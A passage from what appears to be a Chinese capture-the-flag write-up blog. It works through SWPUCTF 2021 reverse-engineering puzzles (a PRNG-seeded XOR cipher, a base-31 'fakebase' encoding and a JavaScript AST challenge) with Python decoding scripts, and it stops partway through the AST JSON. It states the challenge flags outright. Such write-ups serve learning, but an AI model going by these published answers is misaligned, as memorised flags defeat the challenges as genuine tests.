class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">    random.seed(l[i])</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        result.append(<span class="built_in">ord</span>(flag[i*<span class="number">5</span>+n])^random.getrandbits(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]</span></span><br></pre></td></tr></tbody></table></figure><p>这是一个基于伪随机数生成器的异或加密算法。</p><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">encrypted_result</span>):</span><br><span class="line">    <span class="comment"># 第一步：恢复初始的4个随机种子</span></span><br><span class="line">    random.seed(<span class="number">1</span>)</span><br><span class="line">    l = [random.getrandbits(<span class="number">8</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第二步：解密每个字符</span></span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):  <span class="comment"># 4个种子</span></span><br><span class="line">        random.seed(l[i])</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  <span class="comment"># 每个种子对应5个字符</span></span><br><span class="line">            <span class="comment"># 获取加密时的随机数</span></span><br><span class="line">            rand_num = random.getrandbits(<span class="number">8</span>)</span><br><span class="line">            <span class="comment"># 解密：密文异或随机数</span></span><br><span class="line">            decrypted_char = encrypted_result[i*<span class="number">5</span> + n] ^ rand_num</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(decrypted_char))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的加密结果</span></span><br><span class="line">encrypted_result = [<span class="number">201</span>, <span class="number">8</span>, <span class="number">198</span>, <span class="number">68</span>, <span class="number">131</span>, <span class="number">152</span>, <span class="number">186</span>, <span class="number">136</span>, <span class="number">13</span>, <span class="number">130</span>, <span class="number">190</span>, <span class="number">112</span>, <span class="number">251</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">1</span>, <span class="number">31</span>, <span class="number">214</span>, <span class="number">116</span>, <span class="number">244</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">flag = decrypt_flag(encrypted_result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"解密后的flag:"</span>, flag)</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="18-SWPUCTF-2021-新生赛-fakebase"><a href="#18-SWPUCTF-2021-新生赛-fakebase" class="headerlink" title="18 [SWPUCTF 2021 新生赛]fakebase"></a>18 [SWPUCTF 2021 新生赛]fakebase</h2><p>🚩flag：<code>NSSCTF{WHAt_BASe31}</code></p><p>💡hint：<code>Python</code> <code>算法分析</code> <code>语言逆向</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">flag = <span class="string">'xxxxxxxxxxxxxxxxxxx'</span></span><br><span class="line"></span><br><span class="line">s_box = <span class="string">'qwertyuiopasdfghjkzxcvb123456#$'</span></span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    tmp += <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">ord</span>(i)))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">b1 = <span class="built_in">int</span>(tmp,<span class="number">2</span>)</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> b1//<span class="number">31</span> != <span class="number">0</span>:</span><br><span class="line">    s += s_box[b1%<span class="number">31</span>]</span><br><span class="line">    b1 = b1//<span class="number">31</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = u#k4ggia61egegzjuqz12jhfspfkay</span></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">encoded_str, s_box</span>):</span><br><span class="line">    <span class="comment"># 尝试所有可能的k值（0-4）</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        b1 = k</span><br><span class="line">        <span class="comment"># 逆序处理编码字符串</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">reversed</span>(encoded_str):</span><br><span class="line">            b1 = b1 * <span class="number">31</span> + s_box.index(char)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 方法1：使用libnum直接转换为字符串</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = libnum.n2s(b1).decode(<span class="string">'latin-1'</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"尝试k=<span class="subst">{k}</span>，方法1结果: <span class="subst">{flag}</span>"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 方法2：手动转换为二进制再转字符串</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            binary_str = <span class="built_in">bin</span>(b1)[<span class="number">2</span>:]</span><br><span class="line">            <span class="comment"># 补全为8的倍数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(binary_str) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">                binary_str = binary_str.zfill((<span class="built_in">len</span>(binary_str) // <span class="number">8</span> + <span class="number">1</span>) * <span class="number">8</span>)</span><br><span class="line">            </span><br><span class="line">            flag = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_str), <span class="number">8</span>):</span><br><span class="line">                byte = binary_str[i:i+<span class="number">8</span>]</span><br><span class="line">                flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(byte, <span class="number">2</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"尝试k=<span class="subst">{k}</span>，方法2结果: <span class="subst">{flag}</span>"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的编码表和加密结果</span></span><br><span class="line">s_box = <span class="string">'qwertyuiopasdfghjkzxcvb123456#$'</span></span><br><span class="line">encoded_str = <span class="string">'u#k4ggia61egegzjuqz12jhfspfkay'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">decrypt_flag(encoded_str, s_box)</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="19-SWPUCTF-2021-新生赛-astJS"><a href="#19-SWPUCTF-2021-新生赛-astJS" class="headerlink" title="19 [SWPUCTF 2021 新生赛]astJS"></a>19 [SWPUCTF 2021 新生赛]astJS</h2><p>🚩flag：<code>NSSCTF{astIsReallyFunny}</code></p><p>💡hint：<code>逆向技术</code> <code>XOR</code> <code>逆向</code></p><p>题目描述：这也是程序？得到的flag请使用NSSCTF{}格式提交。</p><p>得到的是一个.json文件。</p><p>上网查了一下，考点是AST抽象语法树还原为js代码。</p><figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Program"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">233</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"body"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"ExpressionStatement"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">233</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"expression"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"CallExpression"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">232</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"callee"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"FunctionExpression"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">229</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"expression"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"generator"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"async"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"params"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"body"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"BlockStatement"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">13</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">229</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"body"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"FunctionDeclaration"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">18</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">177</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"id"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                  <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">27</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">29</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"bE"</span></span><br><span class="line">                <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"expression"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"generator"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"async"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"params"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                  <span class="punctuation">{</span></span><br><span class="line">                    <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">30</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">33</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"str"</span></span><br><span class="line">                  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="punctuation">{</span></span><br><span class="line">                    <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">34</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">37</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"key"</span></span><br><span class="line">                  <span class="punctuation">}</span></span><br><span class="line">                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"body"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                  <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"BlockStatement"</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">38</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">177</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">"body"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">{</span></span><br><span class="line">                      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"VariableDeclaration"</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">46</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">70</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"declarations"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="punctuation">{</span></span><br><span class="line">                          <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"VariableDeclarator"</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">69</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">53</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"arr"</span></span><br><span class="line">                          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"init"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"CallExpression"</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">56</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">69</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"callee"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                              <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"MemberExpression"</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">56</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">65</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">"object"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">56</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">59</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"str"</span></span><br><span class="line">                              <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">"property"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">60</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">65</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"split"</span></span><br><span class="line">                              <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">"computed"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                            <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"arguments"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                              <span class="punctuation">{</span></span><br><span class="line">                                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Literal"</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">66</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">68</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"value"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"raw"</span><span class="punctuation">:</span> <span class="string">"''"</span></span><br><span class="line">                              <span class="punctuation">}</span></span><br><span class="line">                            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                          <span class="punctuation">}</span></span><br><span class="line">                        <span class="punctuation">}</span></span><br><span class="line">                      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"kind"</span><span class="punctuation">:</span> <span class="string">"var"</span></span><br><span class="line">                    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="punctuation">{</span></span><br><span class="line">                      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"ReturnStatement"</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">77</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">171</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">"argument"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                        <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"CallExpression"</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">84</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">171</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">"callee"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                          <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"MemberExpression"</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">84</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">167</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">"object"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"CallExpression"</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">84</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">162</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"callee"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                              <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"MemberExpression"</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">84</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">91</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">"object"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">84</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">87</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"arr"</span></span><br><span class="line">                              <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">"property"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">88</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">91</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"map"</span></span><br><span class="line">                              <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">"computed"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                            <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">"arguments"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                              <span class="punctuation">{</span></span><br><span class="line">                                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"ArrowFunctionExpression"</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">92</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">161</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"id"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"expression"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"generator"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"async"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"params"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                  <span class="punctuation">{</span></span><br><span class="line">                                    <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">93</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">94</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"i"</span></span><br><span class="line">                                  <span class="punctuation">}</span></span><br><span class="line">                                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">"body"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                  <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"BlockStatement"</span><span class="punctuation">,</span></span><br><span class="line">                                  <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">97</span><span class="punctuation">,</span></span><br><span class="line">                                  <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">161</span><span class="punctuation">,</span></span><br><span class="line">                                  <span class="attr">"body"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                    <span class="punctuation">{</span></span><br><span class="line">                                      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"ReturnStatement"</span><span class="punctuation">,</span></span><br><span class="line">                                      <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">107</span><span class="punctuation">,</span></span><br><span class="line">                                      <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">,</span></span><br><span class="line">                                      <span class="attr">"argument"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                        <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"CallExpression"</span><span class="punctuation">,</span></span><br><span class="line">                                        <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">114</span><span class="punctuation">,</span></span><br><span class="line">                                        <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">,</span></span><br><span class="line">                                        <span class="attr">"callee"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                          <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"MemberExpression"</span><span class="punctuation">,</span></span><br><span class="line">                                          <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">114</span><span class="punctuation">,</span></span><br><span class="line">                                          <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">133</span><span class="punctuation">,</span></span><br><span class="line">                                          <span class="attr">"object"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                                            <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">114</span><span class="punctuation">,</span></span><br><span class="line">                                            <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">120</span><span class="punctuation">,</span></span><br><span class="line">                                            <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"String"</span></span><br><span class="line">                                          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                                          <span class="attr">"property"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"Identifier"</span><span class="punctuation">,</span></span><br><span class="line">                                            <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">121</span><span class="punctuation">,</span></span><br><span class="line">                                            <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">133</span><span class="punctuation">,</span></span><br><span class="line">                                            <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"fromCharCode"</span></span><br><span class="line">                                          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                                          <span class="attr">"computed"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                                          <span class="attr">"optional"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                                        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">                                        <span class="attr">"arguments"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                          <span class="punctuation">{</span></span><br><span class="line">                                            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"BinaryExpression"</span><span class="punctuation">,</span></span><br><span class="line">                                            <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">134</span><span class="punctuation">,</span></span><br><span class="line">                                            <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">152</span><span class="punctuation">,</span></span><br><span class="line">                                            <span class="attr">"left"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                              <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"CallExpression"</span><span class="punctuation">,</span></span><br><span class="line">                                              <span class="attr">"start"</span><span class="punctuation">:</span> <span class="number">134</span><span class="punctuation">,</span></span><br><span class="line">                                              <span class="attr">"end"</span><span class="punctuation">:</span> <span class="number">148</span><span class="punctuation">,</span></span><br><span class="line">                                              <span class="attr">"callee"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                                                <span class="attr">"type"</span><span class="punctuation">:</span> <span 